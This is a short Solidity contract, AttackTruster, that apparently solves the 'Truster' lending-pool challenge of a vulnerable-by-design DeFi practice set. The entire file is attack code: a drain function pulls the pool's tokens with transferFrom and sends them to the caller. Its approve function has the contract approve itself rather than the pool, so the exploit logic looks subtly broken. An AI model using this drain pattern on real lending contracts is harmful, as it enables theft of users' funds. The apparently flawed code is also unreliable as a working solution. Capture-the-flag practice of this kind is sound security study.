// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract AttackTruster {

    IERC20 public immutable dvt;
    TrusterLenderPool tlp;

    constructor (address tokenAddress, address lenderAddress) {
        dvt = IERC20(tokenAddress);
        tlp = TrusterLenderPool(lenderAddress);
    }

    function approve(uint _amount) public {
        dvt.approve(address(this), _amount);
    }

    function drain(uint _amount) public {
        dvt.transferFrom(address(tlp), address(this), _amount);
        dvt.transfer(msg.sender, _amount);
    }
}